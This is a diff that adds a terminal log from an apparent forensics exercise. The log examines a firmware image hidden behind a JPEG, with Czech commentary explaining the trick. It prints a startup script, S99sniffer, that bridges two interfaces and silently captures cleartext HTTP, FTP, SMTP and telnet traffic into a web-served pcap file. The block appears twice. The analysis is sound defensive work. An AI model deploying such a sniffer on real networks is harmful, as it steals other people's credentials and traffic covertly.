@@ -1,0 +1,117 @@
+rficek@raspiCar:~/pb-task4 $ file memorydump.bin
+memorydump.bin: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, comment: "CREATOR: gd-jpeg v1.0 (using IJG JPEG v62), quality = 90", baseline, precision 8, 500x386, components 3
+rficek@raspiCar:~/pb-task4 $ strings -n 10 memorydump.bin
+;CREATOR: gd-jpeg v1.0 (using IJG JPEG v62), quality = 90
+%&'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz
+&'()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz
+5axoJHU7-u
+iC(S5m8e'M
+imp*    rj#?Y
+ArC`nSQO"Os
+wSeg#E5VM{
+`8lj@aT6v%
+Nv@H9eUB)D
+0z=7b$V"gvp
+vlWM?16RbeJQ
+t       5&v7(^Ut<
++,@mr\%G?.
+\WiD%<CsJR
+Vn28rCN cp
+bK:3%O@/z7
+)I*XqQb.2
+,!fgJJbReM
+R$mR$mR$mR$
+{2+Adi#eAm7.
+y EM@=}R!};F
+5m2~#$)[|u.
+
+rficek@raspiCar:~/pb-task4 $ binwalk -E memorydump.bin
+
+DECIMAL       HEXADECIMAL     ENTROPY
+--------------------------------------------------------------------------------
+0             0x0             Rising entropy edge (0.967968)
+32768         0x8000          Falling entropy edge (0.647798)
+262144        0x40000         Rising entropy edge (0.981154)
+270336        0x42000         Rising entropy edge (0.991222)
+1277952       0x138000        Rising entropy edge (0.985270)
+3047424       0x2E8000        Rising entropy edge (0.953493)
+3055616       0x2EA000        Rising entropy edge (0.985173)
+3596288       0x36E000        Rising entropy edge (0.986929)
+4198400       0x401000        Rising entropy edge (0.952623)
+4513792       0x44E000        Rising entropy edge (0.979024)
+7241728       0x6E8000        Rising entropy edge (0.973479)
+7258112       0x6EC000        Falling entropy edge (0.741497)
+7274496       0x6F0000        Rising entropy edge (0.985535)
+7344128       0x701000        Rising entropy edge (0.979318)
+7462912       0x71E000        Falling entropy edge (0.329809)
+
+rficek@raspiCar:~/pb-task4 $ binwalk memorydump.bin
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             JPEG image data, JFIF standard 1.01
+262144        0x40000         Squashfs filesystem, little endian, version 4.0, compression:gzip, size: 7201786 bytes, 1506 inodes, blocksize: 131072 bytes, created: 2020-04-01 11:45:28
+
+rficek@raspiCar:~/pb-task4 $
+
+Skvělý začátek! Tohle vypadá jako velmi klasický trik: steganografie nebo prosté přilepení dat za legitimní soubor.
+
+Co jsme se právě dozvěděli?
+Kamufláž: Soubor se tváří jako obrázek JPEG (0x0 offset). To je pravděpodobně to, co by viděl běžný uživatel, kdyby soubor otevřel v prohlížeči obrázků.
+
+Skutečný náklad: Na adrese 262144 (0x40000) začíná souborový systém Squashfs. To je přesně to, co hledáme – komprimovaný souborový systém, který se standardně používá u vestavěných zařízení (routery, IoT).
+
+Časová stopa: Vidíme datum vytvoření 2020-04-01 11:45:28. To může být užitečné pro časovou osu útoku.
+
+
+cat ./etc/init.d/S99sniffer
+#!/bin/sh
+
+/usr/sbin/brctl addif br0 eth0 eth1
+nohup /usr/sbin/tcpdump -i br0 -W 10 -C 50 -w /var/www/dump.pcap -s 0 port http or port ftp or port smtp or port telnet &
+rficek@raspiCar:~/pb-task4/_memorydump.bin.extracted/squashfs-root $ file ./bin/busybox
+./bin/busybox: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-uClibc.so.0, stripped
+rficek@raspiCar:~/pb-task4/_memorydump.bin.extracted/squashfs-root $ cd ./usr/bin/
+rficek@raspiCar:~/pb-task4/_memorydump.bin.extracted/squashfs-root/usr/bin $ ls
+'['          checkgid   dbmmanage         env           free           htpasswd    less         lzopcat    od         renice        sha256sum   tee                         tor-resolve   unxz       who
+'[['         chrt       dc                envvars       fuser          httpd       logger       md5sum     openvt     reset         sha3sum     telnet                      tr            unzip      whoami
+ ab          chvt       deallocvt         envvars-std   getconf        httxt2dbm   logname      mesg       passwd     resize        sha512sum   test                        traceroute    uptime     xargs
+ apachectl   cksum      diff              expr          head           id          logresolve   microcom   paste      rotatelogs    shred       tftp                        truncate      uudecode   xmlwf
+ apxs        clear      dirname           factor        hexdump        install     lsof         mkfifo     patch      scp           sort        time                        tty           uuencode   xxd
+ ar          cmp        dos2unix          fallocate     hexedit        ipcrm       lspci        mkpasswd   pcregrep   seq           ssh         top                         uniq          vlock      xz
+ awk         crontab    dropbearconvert   fcgistarter   hostid         ipcs        lsscsi       nl         pcretest   setfattr      strings     tor                         unix2dos      w          xzcat
+ basename    cryptpw    dropbearkey       find          htcacheclean   killall     lsusb        nohup      printf     setkeycodes   svc         tor-gencert                 unlink        wc         yes
+ bunzip2     cut        du                flock         htdbm          last        lzcat        nproc      readlink   setsid        svok        torify                      unlzma        wget
+ bzcat       dbclient   eject             fold          htdigest       ldd         lzma         nslookup   realpath   sha1sum       tail        tor-print-ed-signing-cert   unlzop        which
+rficek@raspiCar:~/pb-task4/_memorydump.bin.extracted/squashfs-root/usr/bin $ cd ../sbin/
+rficek@raspiCar:~/pb-task4/_memorydump.bin.extracted/squashfs-root/usr/sbin $ ls
+addgroup  arping  chroot  delgroup  dnsd      ether-wake  fdformat  i2cdetect  i2cget  inetd     loadfont   rdate        setlogcons  ubirename
+adduser   brctl   crond   deluser   dropbear  fbset       fsfreeze  i2cdump    i2cset  killall5  partprobe  readprofile  tcpdump
+rficek@raspiCar:~/pb-task4/_memorydump.bin.extracted/squashfs-root/usr/sbin $
+
+
+
+cat ./etc/init.d/S99sniffer
+#!/bin/sh
+
+/usr/sbin/brctl addif br0 eth0 eth1
+nohup /usr/sbin/tcpdump -i br0 -W 10 -C 50 -w /var/www/dump.pcap -s 0 port http or port ftp or port smtp or port telnet &
+rficek@raspiCar:~/pb-task4/_memorydump.bin.extracted/squashfs-root $ file ./bin/busybox
+./bin/busybox: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-uClibc.so.0, stripped
+rficek@raspiCar:~/pb-task4/_memorydump.bin.extracted/squashfs-root $ cd ./usr/bin/
+rficek@raspiCar:~/pb-task4/_memorydump.bin.extracted/squashfs-root/usr/bin $ ls
+'['          checkgid   dbmmanage         env           free           htpasswd    less         lzopcat    od         renice        sha256sum   tee                         tor-resolve   unxz       who
+'[['         chrt       dc                envvars       fuser          httpd       logger       md5sum     openvt     reset         sha3sum     telnet                      tr            unzip      whoami
+ ab          chvt       deallocvt         envvars-std   getconf        httxt2dbm   logname      mesg       passwd     resize        sha512sum   test                        traceroute    uptime     xargs
+ apachectl   cksum      diff              expr          head           id          logresolve   microcom   paste      rotatelogs    shred       tftp                        truncate      uudecode   xmlwf
+ apxs        clear      dirname           factor        hexdump        install     lsof         mkfifo     patch      scp           sort        time                        tty           uuencode   xxd
+ ar          cmp        dos2unix          fallocate     hexedit        ipcrm       lspci        mkpasswd   pcregrep   seq           ssh         top                         uniq          vlock      xz
+ awk         crontab    dropbearconvert   fcgistarter   hostid         ipcs        lsscsi       nl         pcretest   setfattr      strings     tor                         unix2dos      w          xzcat
+ basename    cryptpw    dropbearkey       find          htcacheclean   killall     lsusb        nohup      printf     setkeycodes   svc         tor-gencert                 unlink        wc         yes
+ bunzip2     cut        du                flock         htdbm          last        lzcat        nproc      readlink   setsid        svok        torify                      unlzma        wget
+ bzcat       dbclient   eject             fold          htdigest       ldd         lzma         nslookup   realpath   sha1sum       tail        tor-print-ed-signing-cert   unlzop        which
+rficek@raspiCar:~/pb-task4/_memorydump.bin.extracted/squashfs-root/usr/bin $ cd ../sbin/
+rficek@raspiCar:~/pb-task4/_memorydump.bin.extracted/squashfs-root/usr/sbin $ ls
+addgroup  arping  chroot  delgroup  dnsd      ether-wake  fdformat  i2cdetect  i2cget  inetd     loadfont   rdate        setlogcons  ubirename
+adduser   brctl   crond   deluser   dropbear  fbset       fsfreeze  i2cdump    i2cset  killall5  partprobe  readprofile  tcpdump
+rficek@raspiCar:~/pb-task4/_memorydump.bin.extracted/squashfs-root/usr/sbin $
